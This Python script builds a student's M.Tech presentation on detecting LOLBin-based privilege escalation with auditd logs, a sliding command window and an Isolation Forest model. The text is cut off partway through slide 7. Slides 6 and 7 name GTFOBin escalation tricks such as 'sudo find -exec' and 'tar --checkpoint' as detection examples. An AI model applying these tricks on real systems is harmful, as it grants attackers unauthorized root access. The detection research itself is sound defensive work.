#!/usr/bin/env python3
"""
build_final_deck.py
===================
Constructs the final, professional 10-slide PowerPoint (.pptx) presentation
for Anvesh Dhiraj Shivhare's M.Tech Mid-Semester Panel Evaluation at NFSU.

Slide Structure:
  Slide 1: Title
  Slide 2: The Threat: Hackers Hide in Plain Sight with LOLBins
  Slide 3: The Breakthrough: Context Windows Catch Attack Sequences
  Slide 4: System Architecture: End-to-End Defensive Pipeline
  Slide 5: Real-World Evidence: Filtering 25,000 Production Linux Logs
  Slide 6: Live Evidence: The "id" Command Context Effect
  Slide 7: Attack Benchmarks: 100% Attack Chain Interception
  Slide 8: Next Step: Dual-OS Coverage (Windows Sysmon Integration)
  Slide 9: Next Step: Automated EDR Active Response Module
  Slide 10: AI Explainability: Plain-English Reports for SOC Analysts

Outputs:
  presentation/LOLBin_PrivEsc_Detection_Final.pptx
"""

import os
import sys
from pptx import Presentation
from pptx.util import Inches, Pt
from pptx.enum.text import PP_ALIGN, MSO_ANCHOR
from pptx.enum.shapes import MSO_SHAPE
from pptx.dml.color import RGBColor

# ------------------------------------------------------------------------------
# ACADEMIC PALETTE
# ------------------------------------------------------------------------------
COLOR_NAVY_DARK   = RGBColor(15, 23, 42)     # #0F172A - Deep primary text & title
COLOR_NAVY_MID    = RGBColor(30, 58, 138)    # #1E3A8A - Primary academic blue
COLOR_ACCENT_BLUE = RGBColor(37, 99, 235)    # #2563EB - Highlights & key metrics
COLOR_SLATE_BODY  = RGBColor(51, 65, 85)     # #334155 - High readability body text
COLOR_SLATE_MUTED = RGBColor(100, 116, 139)  # #64748B - Footers, subtitles, notes
COLOR_BG_CARD     = RGBColor(255, 255, 255)  # #FFFFFF - White card background
COLOR_BORDER_CARD = RGBColor(226, 232, 240)  # #E2E8F0 - Subtle card border

# BADGE COLORS
BADGE_THREAT_BG   = RGBColor(254, 242, 242)  # #FEF2F2
BADGE_THREAT_LINE = RGBColor(239, 68, 68)    # #EF4444
BADGE_THREAT_TXT  = RGBColor(185, 28, 28)    # #B91C1C

BADGE_SOL_BG      = RGBColor(239, 246, 255)  # #EFF6FF
BADGE_SOL_LINE    = RGBColor(59, 130, 246)   # #3B82F6
BADGE_SOL_TXT     = RGBColor(29, 78, 216)    # #1D4ED8

BADGE_REAL_BG     = RGBColor(240, 253, 244)  # #F0FDF4
BADGE_REAL_LINE   = RGBColor(34, 197, 94)    # #22C55E
BADGE_REAL_TXT    = RGBColor(21, 128, 61)    # #15803D

BADGE_ARCH_BG     = RGBColor(248, 250, 252)  # #F8FAFC
BADGE_ARCH_LINE   = RGBColor(148, 163, 184)  # #94A3B8
BADGE_ARCH_TXT    = RGBColor(51, 65, 85)     # #334155

FONT_HEADING = "Helvetica"
FONT_BODY    = "Helvetica"


def create_final_deck(output_pptx="presentation/LOLBin_PrivEsc_Detection_Final.pptx"):
    prs = Presentation()
    prs.slide_width = Inches(13.333)
    prs.slide_height = Inches(7.5)
    blank_layout = prs.slide_layouts[6]
    TOTAL_SLIDES = 10

    def add_page_decorations(slide, slide_num):
        """Top accent bar, divider, footer, and slide number."""
        accent_line = slide.shapes.add_shape(
            MSO_SHAPE.RECTANGLE, Inches(0), Inches(0), Inches(13.333), Inches(0.08)
        )
        accent_line.fill.solid()
        accent_line.fill.fore_color.rgb = COLOR_NAVY_MID
        accent_line.line.fill.background()

        f_line = slide.shapes.add_shape(
            MSO_SHAPE.RECTANGLE, Inches(0.8), Inches(7.0), Inches(11.733), Inches(0.015)
        )
        f_line.fill.solid()
        f_line.fill.fore_color.rgb = COLOR_BORDER_CARD
        f_line.line.fill.background()

        tx_box = slide.shapes.add_textbox(Inches(0.8), Inches(7.05), Inches(9.0), Inches(0.35))
        tf = tx_box.text_frame
        tf.word_wrap = True
        p = tf.paragraphs[0]
        p.text = "AI-Assisted Detection of LOLBin-Based Privilege Escalation | NFSU M.Tech Cyber Security"
        p.font.name = FONT_BODY
        p.font.size = Pt(9)
        p.font.color.rgb = COLOR_SLATE_MUTED

        tx_num = slide.shapes.add_textbox(Inches(10.5), Inches(7.05), Inches(2.0), Inches(0.35))
        tf_num = tx_num.text_frame
        p_num = tf_num.paragraphs[0]
        p_num.alignment = PP_ALIGN.RIGHT
        p_num.text = f"Slide {slide_num} of {TOTAL_SLIDES}"
        p_num.font.name = FONT_BODY
        p_num.font.size = Pt(9)
        p_num.font.bold = True
        p_num.font.color.rgb = COLOR_SLATE_MUTED

    def add_header(slide, title, subtitle, badge_text, badge_style="arch"):
        """Standardized title, subtitle, and badge."""
        if badge_style == "threat":
            bg, line, txt = BADGE_THREAT_BG, BADGE_THREAT_LINE, BADGE_THREAT_TXT
        elif badge_style == "sol":
            bg, line, txt = BADGE_SOL_BG, BADGE_SOL_LINE, BADGE_SOL_TXT
        elif badge_style == "real":
            bg, line, txt = BADGE_REAL_BG, BADGE_REAL_LINE, BADGE_REAL_TXT
        else:
            bg, line, txt = BADGE_ARCH_BG, BADGE_ARCH_LINE, BADGE_ARCH_TXT

        badge_box = slide.shapes.add_shape(
            MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(0.42), Inches(4.5), Inches(0.32)
        )
        badge_box.fill.solid()
        badge_box.fill.fore_color.rgb = bg
        badge_box.line.color.rgb = line
        badge_box.line.width = Pt(1)

        tf_badge = badge_box.text_frame
        tf_badge.vertical_anchor = MSO_ANCHOR.MIDDLE
        p_badge = tf_badge.paragraphs[0]
        p_badge.text = badge_text
        p_badge.font.name = FONT_BODY
        p_badge.font.size = Pt(8.5)
        p_badge.font.bold = True
        p_badge.font.color.rgb = txt
        p_badge.alignment = PP_ALIGN.CENTER

        tx_title = slide.shapes.add_textbox(Inches(0.8), Inches(0.80), Inches(11.733), Inches(0.55))
        tf_title = tx_title.text_frame
        tf_title.word_wrap = True
        p_title = tf_title.paragraphs[0]
        p_title.text = title
        p_title.font.name = FONT_HEADING
        p_title.font.size = Pt(22)
        p_title.font.bold = True
        p_title.font.color.rgb = COLOR_NAVY_DARK

        tx_sub = slide.shapes.add_textbox(Inches(0.8), Inches(1.35), Inches(11.733), Inches(0.35))
        tf_sub = tx_sub.text_frame
        tf_sub.word_wrap = True
        p_sub = tf_sub.paragraphs[0]
        p_sub.text = subtitle
        p_sub.font.name = FONT_BODY
        p_sub.font.size = Pt(11)
        p_sub.font.color.rgb = COLOR_SLATE_MUTED

    # ==========================================================================
    # SLIDE 1: TITLE SLIDE
    # ==========================================================================
    slide1 = prs.slides.add_slide(blank_layout)

    top_bar = slide1.shapes.add_shape(
        MSO_SHAPE.RECTANGLE, Inches(0), Inches(0), Inches(13.333), Inches(0.12)
    )
    top_bar.fill.solid()
    top_bar.fill.fore_color.rgb = COLOR_NAVY_MID
    top_bar.line.fill.background()

    card_t = slide1.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(0.8), Inches(11.733), Inches(5.8)
    )
    card_t.fill.solid()
    card_t.fill.fore_color.rgb = COLOR_BG_CARD
    card_t.line.color.rgb = COLOR_BORDER_CARD
    card_t.line.width = Pt(1)

    t_badge = slide1.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(1.4), Inches(1.3), Inches(4.8), Inches(0.38)
    )
    t_badge.fill.solid()
    t_badge.fill.fore_color.rgb = BADGE_SOL_BG
    t_badge.line.color.rgb = BADGE_SOL_LINE
    t_badge.line.width = Pt(1)
    tf_tb = t_badge.text_frame
    tf_tb.vertical_anchor = MSO_ANCHOR.MIDDLE
    p_tb = tf_tb.paragraphs[0]
    p_tb.text = "M.TECH CYBER SECURITY | MID-SEMESTER EVALUATION"
    p_tb.font.name = FONT_BODY
    p_tb.font.size = Pt(9.5)
    p_tb.font.bold = True
    p_tb.font.color.rgb = BADGE_SOL_TXT
    p_tb.alignment = PP_ALIGN.CENTER

    tx_main = slide1.shapes.add_textbox(Inches(1.4), Inches(1.85), Inches(10.5), Inches(1.8))
    tf_main = tx_main.text_frame
    tf_main.word_wrap = True
    p_m1 = tf_main.paragraphs[0]
    p_m1.text = "AI-Assisted Detection of LOLBin-Based\nPrivilege Escalation"
    p_m1.font.name = FONT_HEADING
    p_m1.font.size = Pt(32)
    p_m1.font.bold = True
    p_m1.font.color.rgb = COLOR_NAVY_DARK
    p_m1.space_after = Pt(10)

    p_m2 = tf_main.add_paragraph()
    p_m2.text = "Defending enterprise systems by learning normal administrative behavior and catching living-off-the-land attacks using sequence context and AI explainability."
    p_m2.font.name = FONT_BODY
    p_m2.font.size = Pt(13)
    p_m2.font.color.rgb = COLOR_SLATE_BODY

    div = slide1.shapes.add_shape(
        MSO_SHAPE.RECTANGLE, Inches(1.4), Inches(4.0), Inches(10.5), Inches(0.015)
    )
    div.fill.solid()
    div.fill.fore_color.rgb = COLOR_BORDER_CARD
    div.line.fill.background()

    meta_items = [
        ("PRESENTER", "Anvesh Dhiraj Shivhare", "M.Tech Cyber Security, Semester III"),
        ("INSTITUTION", "National Forensic Sciences University", "School of Cyber Security & Digital Forensics, Gandhinagar"),
        ("SYSTEM STATUS", "Complete End-to-End Pipeline", "Verified on Real Ubuntu System Logs & Attack Traces")
    ]

    for i, (tag, line1, line2) in enumerate(meta_items):
        m_box = slide1.shapes.add_textbox(Inches(1.4 + i * 3.6), Inches(4.25), Inches(3.4), Inches(1.8))
        tf_m = m_box.text_frame
        tf_m.word_wrap = True

        p_tag = tf_m.paragraphs[0]
        p_tag.text = tag
        p_tag.font.name = FONT_BODY
        p_tag.font.size = Pt(8.5)
        p_tag.font.bold = True
        p_tag.font.color.rgb = COLOR_ACCENT_BLUE
        p_tag.space_after = Pt(4)

        p_l1 = tf_m.add_paragraph()
        p_l1.text = line1
        p_l1.font.name = FONT_HEADING
        p_l1.font.size = Pt(11)
        p_l1.font.bold = True
        p_l1.font.color.rgb = COLOR_NAVY_DARK
        p_l1.space_after = Pt(2)

        p_l2 = tf_m.add_paragraph()
        p_l2.text = line2
        p_l2.font.name = FONT_BODY
        p_l2.font.size = Pt(9.5)
        p_l2.font.color.rgb = COLOR_SLATE_MUTED

    f_box = slide1.shapes.add_textbox(Inches(0.8), Inches(6.8), Inches(11.733), Inches(0.4))
    tf_f = f_box.text_frame
    p_f = tf_f.paragraphs[0]
    p_f.text = "National Forensic Sciences University (NFSU), Gandhinagar | Mid-Semester Submission"
    p_f.font.name = FONT_BODY
    p_f.font.size = Pt(9)
    p_f.font.color.rgb = COLOR_SLATE_MUTED

    # ==========================================================================
    # SLIDE 2: THE THREAT
    # ==========================================================================
    slide2 = prs.slides.add_slide(blank_layout)
    add_header(
        slide2,
        title="The Threat: Hackers Hide in Plain Sight with LOLBins",
        subtitle="Attackers abuse built-in operating system utilities to bypass traditional antivirus without dropping custom malware",
        badge_text="● THE CORE DEFENSIVE CHALLENGE",
        badge_style="threat"
    )

    threat_cards = [
        (
            "1. Living-off-the-Land (LOLBins)",
            "Attackers No Longer Drop Files",
            "Modern attackers do not introduce custom exploit binaries. Instead, they abuse pre-installed, digitally signed system tools like find, python3, certutil, and tar to execute their attacks.\n\nBecause these utilities are legitimately used by sysadmins every day, standard signature-based antivirus cannot simply block them without breaking normal operations."
        ),
        (
            "2. Traditional Antivirus Blind Spots",
            "Single Commands Look Innocent",
            "Traditional Security Information and Event Management (SIEM) and antivirus tools evaluate commands in complete isolation.\n\nWhen evaluated alone, commands like 'whoami' or 'tar' appear 100% benign. Traditional security scanners miss the malicious context connecting routine reconnaissance to privilege escalation."
        ),
        (
            "3. The Supervised Learning Trap",
            "Models Overfit to Known Attacks",
            "Supervised ML models require huge labeled datasets of attacks. In real production networks, real attack data is virtually non-existent compared to normal logs.\n\nAs academic research proves, supervised models simply memorize past attack strings and fail completely (dropping to ~50% accuracy) on new or obfuscated techniques."
        )
    ]

    for i, (title, subtitle, body) in enumerate(threat_cards):
        left = Inches(0.8 + i * 3.98)
        card = slide2.shapes.add_shape(
            MSO_SHAPE.ROUNDED_RECTANGLE, left, Inches(1.85), Inches(3.78), Inches(4.85)
        )
        card.fill.solid()
        card.fill.fore_color.rgb = COLOR_BG_CARD
        card.line.color.rgb = BADGE_THREAT_LINE
        card.line.width = Pt(1)

        tag = slide2.shapes.add_shape(
            MSO_SHAPE.RECTANGLE, left, Inches(1.85), Inches(3.78), Inches(0.55)
        )
        tag.fill.solid()
        tag.fill.fore_color.rgb = BADGE_THREAT_BG
        tag.line.fill.background()
        tf_tag = tag.text_frame
        tf_tag.vertical_anchor = MSO_ANCHOR.MIDDLE
        p_t = tf_tag.paragraphs[0]
        p_t.text = title
        p_t.font.name = FONT_HEADING
        p_t.font.size = Pt(11)
        p_t.font.bold = True
        p_t.font.color.rgb = BADGE_THREAT_TXT
        p_t.alignment = PP_ALIGN.LEFT
        p_t.margin_left = Inches(0.2)

        tx_body = slide2.shapes.add_textbox(left + Inches(0.18), Inches(2.55), Inches(3.42), Inches(3.9))
        ctf = tx_body.text_frame
        ctf.word_wrap = True

        p_sub = ctf.paragraphs[0]
        p_sub.text = subtitle
        p_sub.font.name = FONT_BODY
        p_sub.font.size = Pt(10.5)
        p_sub.font.bold = True
        p_sub.font.color.rgb = COLOR_NAVY_DARK
        p_sub.space_after = Pt(8)

        p_desc = ctf.add_paragraph()
        p_desc.text = body
        p_desc.font.name = FONT_BODY
        p_desc.font.size = Pt(9.5)
        p_desc.font.color.rgb = COLOR_SLATE_BODY

    add_page_decorations(slide2, 2)

    # ==========================================================================
    # SLIDE 3: THE SOLUTION
    # ==========================================================================
    slide3 = prs.slides.add_slide(blank_layout)
    add_header(
        slide3,
        title="The Solution: Context Windows Catch Attack Sequences",
        subtitle="Looking at sequences of 3 consecutive commands catches multi-step attacks that isolated scanners miss",
        badge_text="● OUR SCIENTIFIC METHODOLOGY",
        badge_style="sol"
    )

    card3_top = slide3.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.85), Inches(11.733), Inches(1.5)
    )
    card3_top.fill.solid()
    card3_top.fill.fore_color.rgb = COLOR_BG_CARD
    card3_top.line.color.rgb = BADGE_SOL_LINE
    card3_top.line.width = Pt(1)

    c3_tf = card3_top.text_frame
    c3_tf.vertical_anchor = MSO_ANCHOR.TOP
    c3_tf.margin_left = Inches(0.25)
    c3_tf.margin_top = Inches(0.15)

    p_top_h = c3_tf.paragraphs[0]
    p_top_h.alignment = PP_ALIGN.LEFT
    p_top_h.text = "Core Innovation: A Sliding Window of 3 Commands (Springer 2026)"
    p_top_h.font.name = FONT_HEADING
    p_top_h.font.size = Pt(12)
    p_top_h.font.bold = True
    p_top_h.font.color.rgb = COLOR_NAVY_DARK

    p_top_d = c3_tf.add_paragraph()
    p_top_d.alignment = PP_ALIGN.LEFT
    p_top_d.text = "Attackers rarely escalate privileges with just one command. A realistic exploit is a sequence: (1) Reconnaissance ➔ (2) Sudo/GTFOBin Exploit ➔ (3) Backdoor Staging. By analyzing a sliding window of 3 consecutive commands within each user session, our model captures the behavioral jump even if individual commands seem normal."
    p_top_d.font.name = FONT_BODY
    p_top_d.font.size = Pt(10)
    p_top_d.font.color.rgb = COLOR_SLATE_BODY
    p_top_d.space_before = Pt(4)

    pillars = [
        (
            "Process Lineage Rarity",
            "Who Started Who?",
            "Tracks parent-child process pairs. Normal system behavior has predictable parents (e.g., systemd starting sshd). When a shell suddenly spawns from 'find' or 'vim', the lineage rarity score triggers an immediate anomaly."
        ),
        (
            "Command Randomness & NLP",
            "Measuring Obfuscation",
            "Computes command length, special character density, and text randomness (entropy). When attackers use Base64 encoding, reverse shells, or hex variables, the randomness score spikes far above ordinary human commands."
        ),
        (
            "Unsupervised Anomaly Model",
            "Learning Normal (Isolation Forest)",
            "Rather than chasing endless new exploit signatures, our model trains strictly on normal system activity. Anything that deviates from normal admin behavior is isolated as an anomaly—no attack labels required."
        )
    ]

    for i, (title, sub, desc) in enumerate(pillars):
        left = Inches(0.8 + i * 3.98)
        card = slide3.shapes.add_shape(
            MSO_SHAPE.ROUNDED_RECTANGLE, left, Inches(3.55), Inches(3.78), Inches(3.15)
        )
        card.fill.solid()
        card.fill.fore_color.rgb = COLOR_BG_CARD
        card.line.color.rgb = COLOR_BORDER_CARD
        card.line.width = Pt(1)

        tx = slide3.shapes.add_textbox(left + Inches(0.18), Inches(3.7), Inches(3.42), Inches(2.8))
        tf = tx.text_frame
        tf.word_wrap = True

        p_t = tf.paragraphs[0]
        p_t.text = title
        p_t.font.name = FONT_HEADING
        p_t.font.size = Pt(11)
        p_t.font.bold = True
        p_t.font.color.rgb = COLOR_NAVY_MID

        p_s = tf.add_paragraph()
        p_s.text = sub
        p_s.font.name = FONT_BODY
        p_s.font.size = Pt(9.5)
        p_s.font.bold = True
        p_s.font.color.rgb = COLOR_ACCENT_BLUE
        p_s.space_before = Pt(2)
        p_s.space_after = Pt(4)

        p_d = tf.add_paragraph()
        p_d.text = desc
        p_d.font.name = FONT_BODY
        p_d.font.size = Pt(9)
        p_d.font.color.rgb = COLOR_SLATE_BODY

    add_page_decorations(slide3, 3)

    # ==========================================================================
    # SLIDE 4: SYSTEM ARCHITECTURE
    # ==========================================================================
    slide4 = prs.slides.add_slide(blank_layout)
    add_header(
        slide4,
        title="System Architecture: End-to-End Defensive Pipeline",
        subtitle="How endpoint system calls flow into sliding-window features, anomaly detection, and plain-English SOC summaries",
        badge_text="● ARCHITECTURE OVERVIEW",
        badge_style="arch"
    )

    stages = [
        (
            "1. Telemetry Ingestion",
            "Auditd Parser",
            [
                "Ingests raw Linux auditd streams in real time.",
                "Combines process start, arguments, user ID, and working directory.",
                "Decodes hex command lines into clean plaintext."
            ],
            "OPERATIONAL ON LINUX\n(25,495 Real Events)"
        ),
        (
            "2. Feature Engineering",
            "3-Command Window",
            [
                "Calculates Process Lineage Rarity.",
                "Extracts Command Randomness (Entropy) and length.",
                "Maintains a sliding 3-command context window per session."
            ],
            "SEQUENCE AWARE\n(Springer 2026 Grounded)"
        ),
        (
            "3. Anomaly Detection",
            "Isolation Forest",
            [
                "Trained strictly on clean, normal administrator baseline.",
                "Scores events from 0.00 (Normal) to 1.00 (Severe Anomaly).",
                "Flagging threshold set at 0.50 to minimize false alarms."
            ],
            "UNSUPERVISED ML\n(No Attack Labels Needed)"
        ),
        (
            "4. AI Explainability",
            "LLM SOC Analyst",
            [
                "Takes the mathematical anomaly score and command history.",
                "Maps the technique to MITRE ATT&CK framework.",
                "Generates a 1-paragraph plain-English incident report."
            ],
            "INSTANT TRIAGE\n(No Mathematical Jargon)"
        )
    ]

    for i, (title, comp, desc_bullets, status) in enumerate(stages):
        left = Inches(0.8 + i * 2.98)
        card = slide4.shapes.add_shape(
            MSO_SHAPE.ROUNDED_RECTANGLE, left, Inches(1.85), Inches(2.8), Inches(4.35)
        )
        card.fill.solid()
        card.fill.fore_color.rgb = COLOR_BG_CARD
        card.line.color.rgb = COLOR_BORDER_CARD
        card.line.width = Pt(1)

        tag = slide4.shapes.add_shape(
            MSO_SHAPE.RECTANGLE, left, Inches(1.85), Inches(2.8), Inches(0.42)
        )
        tag.fill.solid()
        tag.fill.fore_color.rgb = COLOR_NAVY_MID
        tag.line.fill.background()
        tf_tag = tag.text_frame
        tf_tag.vertical_anchor = MSO_ANCHOR.MIDDLE
        p_t = tf_tag.paragraphs[0]
        p_t.text = title
        p_t.font.name = FONT_HEADING
        p_t.font.size = Pt(10)
        p_t.font.bold = True
        p_t.font.color.rgb = RGBColor(255, 255, 255)
        p_t.alignment = PP_ALIGN.CENTER

        tx_body = slide4.shapes.add_textbox(left + Inches(0.12), Inches(2.32), Inches(2.56), Inches(2.75))
        ctf = tx_body.text_frame
        ctf.word_wrap = True

        p_comp = ctf.paragraphs[0]
        p_comp.text = comp
        p_comp.font.name = FONT_BODY
        p_comp.font.size = Pt(9.5)
        p_comp.font.bold = True
        p_comp.font.color.rgb = COLOR_ACCENT_BLUE

        for b in desc_bullets:
            p_b = ctf.add_paragraph()
            p_b.text = f"• {b}"
            p_b.font.name = FONT_BODY
            p_b.font.size = Pt(8.5)
            p_b.font.color.rgb = COLOR_SLATE_BODY
            p_b.space_before = Pt(4)

        s_box = slide4.shapes.add_shape(
            MSO_SHAPE.ROUNDED_RECTANGLE, left + Inches(0.15), Inches(5.42), Inches(2.5), Inches(0.60)
        )
        s_box.fill.solid()
        s_box.fill.fore_color.rgb = RGBColor(241, 245, 249)
        s_box.line.color.rgb = COLOR_BORDER_CARD
        s_tf = s_box.text_frame
        s_tf.vertical_anchor = MSO_ANCHOR.MIDDLE
        p_s = s_tf.paragraphs[0]
        p_s.text = status
        p_s.font.name = FONT_BODY
        p_s.font.size = Pt(8.5)
        p_s.font.bold = True
        p_s.font.color.rgb = COLOR_NAVY_DARK
        p_s.alignment = PP_ALIGN.CENTER

    for i in range(3):
        arrow = slide4.shapes.add_textbox(Inches(3.55 + i * 2.98), Inches(3.7), Inches(0.3), Inches(0.3))
        tf_a = arrow.text_frame
        p_a = tf_a.paragraphs[0]
        p_a.text = "➔"
        p_a.font.size = Pt(16)
        p_a.font.bold = True
        p_a.font.color.rgb = COLOR_ACCENT_BLUE

    note_box = slide4.shapes.add_textbox(Inches(0.8), Inches(6.32), Inches(11.733), Inches(0.55))
    tf_n = note_box.text_frame
    p_n = tf_n.paragraphs[0]
    p_n.text = "Key Advantage: The pipeline is fully automated—events flow from auditd, get enriched with sequence context, scored by Isolation Forest, and translated into SOC-ready summaries by the LLM without manual analyst intervention."
    p_n.font.name = FONT_BODY
    p_n.font.size = Pt(9)
    p_n.font.color.rgb = COLOR_SLATE_MUTED

    add_page_decorations(slide4, 4)

    # ==========================================================================
    # SLIDE 5: REAL UBUNTU RESULTS
    # ==========================================================================
    slide5 = prs.slides.add_slide(blank_layout)
    add_header(
        slide5,
        title="Real Ubuntu Results: Filtering Normal Sysadmin Behavior",
        subtitle="Tested on 25,495 real Linux auditd events to prove normal activity doesn't cause false alarms",
        badge_text="● REAL UBUNTU AUDITD VALIDATION",
        badge_style="real"
    )

    card5 = slide5.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.85), Inches(5.6), Inches(4.85)
    )
    card5.fill.solid()
    card5.fill.fore_color.rgb = COLOR_BG_CARD
    card5.line.color.rgb = COLOR_BORDER_CARD
    card5.line.width = Pt(1)

    c5_tf = card5.text_frame
    c5_tf.vertical_anchor = MSO_ANCHOR.TOP
    c5_tf.margin_left = Inches(0.25)
    c5_tf.margin_top = Inches(0.2)
    c5_tf.word_wrap = True

    p_5_h = c5_tf.paragraphs[0]
    p_5_h.alignment = PP_ALIGN.LEFT
    p_5_h.text = "Normal Baseline Verification (N = 7,649 Held-Out Events)"
    p_5_h.font.name = FONT_HEADING
    p_5_h.font.size = Pt(11.5)
    p_5_h.font.bold = True
    p_5_h.font.color.rgb = COLOR_NAVY_DARK

    b_stats = [
        ("25,495 Real System Events Collected:", "Recorded from routine Ubuntu software updates, developer tests, cron jobs, and file operations."),
        ("Strict 70/30 Split:", "17,846 events used to train the normal model; 7,649 separate events used to test false alarm rates."),
        ("Only 4.67% False Positive Rate:", "Over 95.3% of normal system tasks safely scored below the alarm boundary (threshold = 0.50)."),
        ("Median Anomaly Score of 0.03:", "Typical system tasks scored near zero, proving normal behavior sits deep inside the safe zone."),
        ("87.4% Scored Under 0.20:", "6,682 events produced near-zero scores, showing high model confidence in routine system activity."),
        ("Normal Tools Stay Clean:", "Legitimate uses of 'find' (0.0% false alarms) and 'awk' (0.0% false alarms) were correctly left unflagged.")
    ]

    for label, val in b_stats:
        p_row = c5_tf.add_paragraph()
        p_row.alignment = PP_ALIGN.LEFT
        p_row.text = f"• {label} "
        p_row.font.name = FONT_BODY
        p_row.font.size = Pt(9.5)
        p_row.font.bold = True
        p_row.font.color.rgb = COLOR_NAVY_MID
        p_row.space_before = Pt(4)

        run = p_row.add_run()
        run.text = val
        run.font.bold = False
        run.font.color.rgb = COLOR_SLATE_BODY

    card5_r = slide5.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.6), Inches(1.85), Inches(5.933), Inches(4.85)
    )
    card5_r.fill.solid()
    card5_r.fill.fore_color.rgb = COLOR_BG_CARD
    card5_r.line.color.rgb = COLOR_BORDER_CARD
    card5_r.line.width = Pt(1)

    chart5_path = "presentation/assets_simplified/slide5_baseline_simple.png"
    if os.path.exists(chart5_path):
        slide5.shapes.add_picture(chart5_path, Inches(6.7), Inches(2.0), width=Inches(5.733))

    add_page_decorations(slide5, 5)

    # ==========================================================================
    # SLIDE 6: LIVE EVIDENCE - THE 'ID' COMMAND CONTEXT EFFECT
    # ==========================================================================
    slide6 = prs.slides.add_slide(blank_layout)
    add_header(
        slide6,
        title="Live Evidence: The 'id' Command Context Effect",
        subtitle="The exact same command scores 0.08 in isolation vs. 0.58 mid-sequence, proving sequence awareness",
        badge_text="● REAL UBUNTU AUDITD INFERENCE",
        badge_style="real"
    )

    card6 = slide6.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.85), Inches(5.6), Inches(4.85)
    )
    card6.fill.solid()
    card6.fill.fore_color.rgb = COLOR_BG_CARD
    card6.line.color.rgb = COLOR_BORDER_CARD
    card6.line.width = Pt(1)

    c6_tf = card6.text_frame
    c6_tf.vertical_anchor = MSO_ANCHOR.TOP
    c6_tf.margin_left = Inches(0.25)
    c6_tf.margin_top = Inches(0.2)
    c6_tf.word_wrap = True

    p_6_h = c6_tf.paragraphs[0]
    p_6_h.alignment = PP_ALIGN.LEFT
    p_6_h.text = "How Context Windows Elevate Subtle Reconnaissance"
    p_6_h.font.name = FONT_HEADING
    p_6_h.font.size = Pt(11.5)
    p_6_h.font.bold = True
    p_6_h.font.color.rgb = COLOR_NAVY_DARK

    id_findings = [
        ("The Reconnaissance Dilemma:", "Hackers routinely execute 'id' or 'whoami' immediately after escalating privileges to verify root access. But sysadmins also run 'id' constantly."),
        ("In Isolation (Score: 0.05 – 0.12):", "When executed alone or in benign sessions, 'id' scores safely below the 0.50 alarm line (Events #68, #85, #109). Traditional single-command tools ignore it."),
        ("Mid-Attack Sequence (Score: 0.58!):", "When the exact same 'id' command is executed immediately after an exploit (like 'tar --checkpoint' or 'python3'), our 3-command window carries forward the suspicious context."),
        ("Alarm Successfully Triggered:", "The score immediately jumps from ~0.08 to 0.5792 & 0.5834 (Events #83, #106)—crossing the 0.50 threshold and raising an alarm!"),
        ("Springer (2026) Empirically Proven:", "Evaluating command windows catches attackers checking root access even when using completely legitimate tools.")
    ]

    for label, val in id_findings:
        p_row = c6_tf.add_paragraph()
        p_row.alignment = PP_ALIGN.LEFT
        p_row.text = f"• {label} "
        p_row.font.name = FONT_BODY
        p_row.font.size = Pt(9.5)
        p_row.font.bold = True
        p_row.font.color.rgb = COLOR_NAVY_MID
        p_row.space_before = Pt(4)

        run = p_row.add_run()
        run.text = val
        run.font.bold = False
        run.font.color.rgb = COLOR_SLATE_BODY

    card6_r = slide6.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.6), Inches(1.85), Inches(5.933), Inches(4.85)
    )
    card6_r.fill.solid()
    card6_r.fill.fore_color.rgb = COLOR_BG_CARD
    card6_r.line.color.rgb = COLOR_BORDER_CARD
    card6_r.line.width = Pt(1)

    chart6_path = "presentation/assets/slide7_window_context.png"
    if os.path.exists(chart6_path):
        slide6.shapes.add_picture(chart6_path, Inches(6.7), Inches(2.0), width=Inches(5.733))

    add_page_decorations(slide6, 6)

    # ==========================================================================
    # SLIDE 7: THE BENCHMARKS
    # ==========================================================================
    slide7 = prs.slides.add_slide(blank_layout)
    add_header(
        slide7,
        title="Attack Benchmarks: 100% Attack Chain Interception",
        subtitle="Evaluated across three attack tiers; the 3-command window caught and stopped all 60 attack sequences",
        badge_text="● ATTACK BENCHMARKS & EVALUATION",
        badge_style="sol"
    )

    card7 = slide7.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.85), Inches(5.6), Inches(4.85)
    )
    card7.fill.solid()
    card7.fill.fore_color.rgb = COLOR_BG_CARD
    card7.line.color.rgb = COLOR_BORDER_CARD
    card7.line.width = Pt(1)

    c7_tf = card7.text_frame
    c7_tf.vertical_anchor = MSO_ANCHOR.TOP
    c7_tf.margin_left = Inches(0.25)
    c7_tf.margin_top = Inches(0.2)
    c7_tf.word_wrap = True

    p_7_h = c7_tf.paragraphs[0]
    p_7_h.alignment = PP_ALIGN.LEFT
    p_7_h.text = "Performance Across Attack Complexity Tiers"
    p_7_h.font.name = FONT_HEADING
    p_7_h.font.size = Pt(11.5)
    p_7_h.font.bold = True
    p_7_h.font.color.rgb = COLOR_NAVY_DARK

    benchmarks = [
        ("Tier 1: Overt Single Attacks ➔ 100% Caught", [
            "Direct GTFOBin exploits (e.g., 'sudo find -exec', 'sudo python3 exec').",
            "Every single overt attack command was caught immediately (100% recall, 0.995 F1)."
        ]),
        ("Tier 2: Multi-Step Attack Chains ➔ 100% Intercepted", [
            "Realistic multi-step sequences: Reconnaissance ➔ Privilege Jump ➔ Backdoor Staging.",
            "100% Chain Interception: All 60 out of 60 attack chains were flagged and halted!",
            "Rapid Response: Average detection delay was only 0.25 commands (Step 0 or Step 1)."
        ]),
        ("Tier 3: Stealthy & Obfuscated Attacks ➔ 90.0% Caught", [
            "Attackers hiding commands with Base64 encoding or hex escaping.",
            "Model still caught 90% of obfuscated attempts due to elevated command line randomness."
        ])
    ]

    for title, subitems in benchmarks:
        p_th = c7_tf.add_paragraph()
        p_th.alignment = PP_ALIGN.LEFT
        p_th.text = f"\n{title}"
        p_th.font.name = FONT_BODY
        p_th.font.size = Pt(9.5)
        p_th.font.bold = True
